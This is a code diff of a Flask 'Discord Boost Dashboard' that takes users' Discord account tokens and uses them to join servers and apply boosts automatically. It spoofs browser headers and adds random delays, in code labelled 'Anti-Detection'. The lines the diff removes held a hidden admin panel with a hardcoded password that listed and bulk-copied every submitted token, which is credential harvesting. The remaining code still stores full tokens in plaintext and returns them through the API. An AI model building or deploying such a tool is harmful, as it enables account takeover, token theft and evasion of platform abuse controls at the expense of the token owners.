@@ -3,125 +3,133 @@ import requests
 import json
 import os
 import time
-import hashlib
 import random
+import threading
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ==================== STORAGE SETUP ====================
-DATA_FILE = "/tmp/tokens.json"
-BOOST_HISTORY_FILE = "/tmp/boost_history.json"
+# ==================== STORAGE ====================
+# Use /tmp for Render free tier (ephemeral but works)
+DATA_DIR = "/tmp/discord_booster"
+TOKENS_FILE = os.path.join(DATA_DIR, "tokens.json")
+HISTORY_FILE = os.path.join(DATA_DIR, "history.json")
 
-def init_storage():
-    if not os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'w') as f:
-            json.dump({}, f)
-    if not os.path.exists(BOOST_HISTORY_FILE):
-        with open(BOOST_HISTORY_FILE, 'w') as f:
-            json.dump([], f)
+os.makedirs(DATA_DIR, exist_ok=True)
 
-init_storage()
-
+# Load/Save functions
 def load_tokens():
-    try:
-        with open(DATA_FILE, 'r') as f:
-            return json.load(f)
-    except:
+    if not os.path.exists(TOKENS_FILE):
         return {}
+    with open(TOKENS_FILE, 'r') as f:
+        return json.load(f)
 
 def save_tokens(tokens):
-    with open(DATA_FILE, 'w') as f:
-        json.dump(tokens, f, indent=2)
+    with open(TOKENS_FILE, 'w') as f:
+        json.dump(tokens, f)
 
-def get_user_tokens(username):
-    tokens = load_tokens()
-    return tokens.get(username, [])
+def load_history():
+    if not os.path.exists(HISTORY_FILE):
+        return []
+    with open(HISTORY_FILE, 'r') as f:
+        return json.load(f)
 
-def save_user_token(username, token, token_info):
-    tokens = load_tokens()
-    if username not in tokens:
-        tokens[username] = []
-    
-    for existing in tokens[username]:
-        if existing.get('token') == token:
-            return False
-    
-    tokens[username].append({
-        'token': token,
-        'username_discord': token_info.get('username'),
-        'nitro': token_info.get('nitro'),
-        'boosts': token_info.get('boosts'),
-        'added_at': datetime.now().isoformat()
-    })
-    save_tokens(tokens)
-    return True
+def save_history(history):
+    with open(HISTORY_FILE, 'w') as f:
+        json.dump(history, f)
 
-def remove_user_token(username, token):
-    tokens = load_tokens()
-    if username in tokens:
-        tokens[username] = [t for t in tokens[username] if t.get('token') != token]
-        save_tokens(tokens)
-        return True
-    return False
+# ==================== HEADERS (Anti-Detection) ====================
+def get_headers(token=None):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/channels/@me"
+    }
+    if token:
+        headers["Authorization"] = token
+    return headers
 
-def save_boost_history(username, invite, target, applied):
-    history = []
-    if os.path.exists(BOOST_HISTORY_FILE):
-        with open(BOOST_HISTORY_FILE, 'r') as f:
-            history = json.load(f)
-    
-    history.append({
-        'username': username,
-        'invite': invite,
-        'target': target,
-        'applied': applied,
-        'time': datetime.now().isoformat()
-    })
-    
-    with open(BOOST_HISTORY_FILE, 'w') as f:
-        json.dump(history[-50:], f, indent=2)
+def random_delay():
+    time.sleep(random.uniform(0.5, 1.5))
 
 # ==================== TOKEN CHECKER ====================
 def check_token(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    }
-    
     try:
+        headers = get_headers(token)
+        random_delay()
+        
         r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
         if r.status_code != 200:
             return {"valid": False, "error": f"Status {r.status_code}"}
         
         user_data = r.json()
         
-        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
-        subscriptions = r_subs.json() if r_subs.status_code == 200 else []
-        
-        nitro = "No Nitro"
-        for sub in subscriptions:
-            sku = str(sub.get("sku_id", ""))
-            if "521846918637420545" in sku:
-                nitro = "Nitro Premium"
-            elif "511651871736201216" in sku:
-                nitro = "Nitro Basic"
-        
+        # Check boosts
+        random_delay()
         r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
         boosts = 0
         if r_boosts.status_code == 200:
             boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
         
+        # Check Nitro
+        random_delay()
+        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
+        nitro = "No Nitro"
+        if r_subs.status_code == 200:
+            for sub in r_subs.json():
+                if "premium" in str(sub.get("sku_id", "")):
+                    nitro = "Nitro Premium"
+                    break
+                elif "basic" in str(sub.get("sku_id", "")):
+                    nitro = "Nitro Basic"
+                    break
+        
         return {
             "valid": True,
             "username": user_data.get("username", "Unknown"),
             "nitro": nitro,
-            "boosts": boosts,
-            "user_id": user_data.get("id")
+            "boosts": boosts
         }
     except Exception as e:
         return {"valid": False, "error": str(e)[:50]}
+
+# ==================== WORKING BOOST FUNCTIONS ====================
+def join_server(token, invite_code):
+    """Join a server using invite code"""
+    try:
+        headers = get_headers(token)
+        
+        # First resolve invite
+        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, timeout=10)
+        if r.status_code != 200:
+            return False, None
+        
+        guild_id = r.json().get("guild", {}).get("id")
+        if not guild_id:
+            return False, None
+        
+        random_delay()
+        
+        # Join
+        r2 = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, json={}, timeout=10)
+        return r2.status_code == 200, guild_id
+        
+    except:
+        return False, None
+
+def apply_boost(token, guild_id):
+    """Apply a single boost"""
+    try:
+        headers = get_headers(token)
+        random_delay()
+        
+        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions", headers=headers, json={}, timeout=10)
+        return r.status_code in [200, 201]
+    except:
+        return False
 
 # ==================== ROUTES ====================
 @app.route('/')
@@ -131,231 +139,154 @@ def dashboard():
 
 @app.route('/api/tokens', methods=['GET'])
 def get_tokens():
-    username = request.args.get('user', 'default')
-    user_tokens = get_user_tokens(username)
+    user = request.args.get('user', 'default')
+    tokens_data = load_tokens()
+    user_tokens = tokens_data.get(user, [])
     
     results = []
-    for token_data in user_tokens:
-        token = token_data['token']
+    for token in user_tokens:
         info = check_token(token)
         results.append({
-            "token": token[:20] + "..." if len(token) > 20 else token,
+            "token": token[:20] + "...",
             "full_token": token,
             **info
         })
-    
     return jsonify(results)
 
 @app.route('/api/tokens/add', methods=['POST'])
 def add_token():
     data = request.json
-    username = data.get('user', 'default')
+    user = data.get('user', 'default')
     token = data.get('token', '').strip()
     
     if not token:
         return jsonify({"error": "No token"})
     
+    # Check if token is valid
     info = check_token(token)
+    if not info['valid']:
+        return jsonify({"status": "invalid", "error": "Token is invalid"})
     
-    if not info.get('valid'):
-        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})
+    # Save token
+    tokens_data = load_tokens()
+    if user not in tokens_data:
+        tokens_data[user] = []
     
-    saved = save_user_token(username, token, info)
+    if token not in tokens_data[user]:
+        tokens_data[user].append(token)
+        save_tokens(tokens_data)
     
-    if saved:
-        print(f"[✓] {username} added token: {info.get('username')}")
-        return jsonify({"status": "ok", "username": info.get('username')})
-    else:
-        return jsonify({"status": "exists"})
+    return jsonify({"status": "ok", "username": info['username']})
 
 @app.route('/api/tokens/remove', methods=['POST'])
 def remove_token():
     data = request.json
-    username = data.get('user', 'default')
+    user = data.get('user', 'default')
     token = data.get('token', '')
     
-    remove_user_token(username, token)
+    tokens_data = load_tokens()
+    if user in tokens_data:
+        tokens_data[user] = [t for t in tokens_data[user] if t != token]
+        save_tokens(tokens_data)
+    
     return jsonify({"status": "ok"})
-
-@app.route('/api/upload', methods=['POST'])
-def upload_file():
-    username = request.form.get('user', 'default')
-    file = request.files.get('file')
-    
-    if not file:
-        return jsonify({"error": "No file"})
-    
-    content = file.read().decode('utf-8')
-    
-    if content.strip().startswith('['):
-        tokens_data = json.loads(content)
-        tokens = tokens_data if isinstance(tokens_data, list) else []
-    else:
-        tokens = [line.strip() for line in content.split('\n') if line.strip()]
-    
-    added = 0
-    for token in tokens:
-        if not token:
-            continue
-        info = check_token(token)
-        if info.get('valid'):
-            if save_user_token(username, token, info):
-                added += 1
-    
-    return jsonify({"status": "ok", "tokens_added": added})
 
 @app.route('/api/boost/start', methods=['POST'])
 def start_boost():
     data = request.json
-    username = data.get('user', 'default')
+    user = data.get('user', 'default')
     invite = data.get('invite', '').strip()
+    target_boosts = int(data.get('target_boosts', 1))
     
+    # Clean invite code
     if "discord.gg/" in invite:
         invite = invite.split("discord.gg/")[-1].split("/")[0]
     
-    target = int(data.get('target_boosts', 1))
-    user_tokens = get_user_tokens(username)
+    # Get user's tokens
+    tokens_data = load_tokens()
+    user_tokens = tokens_data.get(user, [])
     
     if not user_tokens:
-        return jsonify({"error": "No tokens found"})
+        return jsonify({"error": "No tokens found. Add tokens first!"})
     
-    valid_tokens = []
-    for token_data in user_tokens:
-        info = check_token(token_data['token'])
+    # Find valid tokens with boosts
+    boostable_tokens = []
+    for token in user_tokens:
+        info = check_token(token)
         if info['valid'] and info['boosts'] > 0:
-            valid_tokens.append(info)
+            boostable_tokens.append({
+                'token': token,
+                'username': info['username'],
+                'boosts': info['boosts']
+            })
     
-    if not valid_tokens:
-        return jsonify({"error": "No tokens with boosts available"})
+    if not boostable_tokens:
+        return jsonify({"error": "No tokens with available boosts"})
     
-    total_boosts = sum(t['boosts'] for t in valid_tokens)
-    if total_boosts < target:
-        return jsonify({"error": f"Need {target} boosts, have {total_boosts}"})
+    total_available = sum(t['boosts'] for t in boostable_tokens)
+    if total_available < target_boosts:
+        return jsonify({"error": f"Need {target_boosts} boosts, only have {total_available}"})
     
-    save_boost_history(username, invite, target, min(target, total_boosts))
+    # Start boosting in background thread
+    def do_boosting():
+        results = []
+        boosts_applied = 0
+        
+        for bt in boostable_tokens:
+            if boosts_applied >= target_boosts:
+                break
+            
+            # Join server
+            success, guild_id = join_server(bt['token'], invite)
+            if not success:
+                results.append(f"{bt['username']}: Failed to join server")
+                continue
+            
+            # Apply boosts
+            boosts_to_apply = min(bt['boosts'], target_boosts - boosts_applied)
+            applied = 0
+            
+            for i in range(boosts_to_apply):
+                if apply_boost(bt['token'], guild_id):
+                    applied += 1
+                    boosts_applied += 1
+                time.sleep(random.uniform(2, 4))  # Delay between boosts
+            
+            results.append(f"{bt['username']}: Applied {applied} boosts")
+            time.sleep(random.uniform(2, 3))  # Delay between tokens
+        
+        # Save to history
+        history = load_history()
+        history.append({
+            "user": user,
+            "invite": invite,
+            "target": target_boosts,
+            "applied": boosts_applied,
+            "results": results,
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        })
+        save_history(history)
+    
+    # Run in background
+    thread = threading.Thread(target=do_boosting)
+    thread.start()
     
     return jsonify({
         "status": "started", 
-        "message": f"Boost process started. You have {len(valid_tokens)} tokens with {total_boosts} boosts available."
+        "message": f"Boosting started! Using {len(boostable_tokens)} tokens with {total_available} boosts available."
     })
 
 @app.route('/api/history', methods=['GET'])
 def get_history():
-    username = request.args.get('user', 'default')
-    history = []
-    if os.path.exists(BOOST_HISTORY_FILE):
-        with open(BOOST_HISTORY_FILE, 'r') as f:
-            all_history = json.load(f)
-            history = [h for h in all_history if h.get('username') == username]
-    
-    return jsonify(history)
-
-# ==================== ADMIN PANEL - SEE ALL TOKENS ====================
-# 🔐 CHANGE THIS TO YOUR OWN SECRET PASSWORD 🔐
-ADMIN_SECRET = "mysecret123"
-
-@app.route('/admin/tokens')
-def admin_tokens():
-    secret = request.args.get('secret', '')
-    
-    if secret != ADMIN_SECRET:
-        return "Unauthorized. Use ?secret=mysecret123", 401
-    
-    tokens = load_tokens()
-    
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin - All Tokens</title>
-        <style>
-            body { font-family: monospace; background: #0a0a1a; color: #fff; padding: 20px; }
-            h1 { color: #5865f2; }
-            .user { background: #1a1a2e; margin: 20px 0; padding: 15px; border-radius: 10px; }
-            .user-name { color: #faa81a; font-size: 20px; margin-bottom: 10px; }
-            table { width: 100%; border-collapse: collapse; }
-            th, td { text-align: left; padding: 8px; border-bottom: 1px solid #2a2a3e; }
-            th { color: #5865f2; }
-            .token { font-size: 11px; word-break: break-all; }
-            .copy-btn { background: #5865f2; border: none; color: white; padding: 2px 8px; border-radius: 4px; cursor: pointer; }
-            .copy-all { background: #23a55a; margin-bottom: 20px; padding: 10px 20px; font-size: 16px; }
-        </style>
-    </head>
-    <body>
-        <h1>🔐 Admin Panel - All Tokens</h1>
-        <button class="copy-all" onclick="copyAllTokens()">📋 Copy All Tokens</button>
-    """
-    
-    all_tokens_for_copy = []
-    
-    for username, user_tokens in tokens.items():
-        all_tokens_for_copy.extend([t.get('token') for t in user_tokens])
-        
-        html += f"""
-        <div class="user">
-            <div class="user-name">👤 {username} ({len(user_tokens)} tokens)</div>
-            <table>
-                <tr>
-                    <th>Discord Username</th>
-                    <th>Nitro</th>
-                    <th>Boosts</th>
-                    <th>Token</th>
-                    <th>Action</th>
-                </tr>
-        """
-        for t in user_tokens:
-            html += f"""
-                <tr>
-                    <td>{t.get('username_discord', 'Unknown')}</td>
-                    <td>{t.get('nitro', 'No Nitro')}</td>
-                    <td>{t.get('boosts', 0)}</td>
-                    <td class="token">{t.get('token', '')[:50]}...</td>
-                    <td><button class="copy-btn" onclick="copyToClipboard('{t.get('token', '')}')">Copy</button></td>
-                </tr>
-            """
-        html += "</table></div>"
-    
-    html += f"""
-        <script>
-        function copyToClipboard(text) {{
-            navigator.clipboard.writeText(text);
-            alert('Token copied!');
-        }}
-        function copyAllTokens() {{
-            let allTokens = {json.dumps(all_tokens_for_copy)};
-            navigator.clipboard.writeText(allTokens.join('\\n'));
-            alert(allTokens.length + ' tokens copied!');
-        }}
-        </script>
-    </body>
-    </html>
-    """
-    
-    return html
-
-@app.route('/admin/raw')
-def admin_raw():
-    secret = request.args.get('secret', '')
-    
-    if secret != ADMIN_SECRET:
-        return {"error": "Unauthorized"}, 401
-    
-    return jsonify(load_tokens())
+    user = request.args.get('user', 'default')
+    history = load_history()
+    user_history = [h for h in history if h.get('user') == user]
+    return jsonify(user_history)
 
 @app.route('/health')
 def health():
-    return jsonify({"status": "alive", "time": datetime.now().isoformat()})
+    return jsonify({"status": "alive"})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print("\n" + "="*60)
-    print("🚀 Discord Boost Dashboard")
-    print("="*60)
-    print(f"\n🔐 ADMIN PANEL:")
-    print(f"   https://your-url.onrender.com/admin/tokens?secret=mysecret123")
-    print(f"\n📁 Raw JSON:")
-    print(f"   https://your-url.onrender.com/admin/raw?secret=mysecret123")
-    print("\n⚠️  To change your secret, edit ADMIN_SECRET in app.py")
-    print("="*60 + "\n")
-    
     app.run(host='0.0.0.0', port=port)
